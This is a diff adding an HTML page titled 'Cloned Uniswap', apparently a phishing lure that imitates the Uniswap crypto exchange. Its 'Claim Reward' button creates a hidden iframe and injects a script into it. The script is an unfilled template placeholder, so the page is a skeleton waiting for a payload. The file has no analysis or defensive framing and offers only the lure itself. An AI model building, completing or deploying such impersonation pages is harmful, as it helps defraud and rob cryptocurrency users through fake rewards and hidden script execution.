@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cloned Uniswap</title>
+</head>
+<body>
+    <h1>Welcome to Cloned Uniswap</h1>
+    <button onclick="claimReward()">Claim Reward</button>
+
+    <script>
+        function claimReward() {
+            var iframe = document.createElement("iframe");
+            iframe.srcdoc = "<style>body{{display:none;}}</style><script>{}</script>";
+            document.body.appendChild(iframe);
+        }
+    </script>
+</body>
+</html>
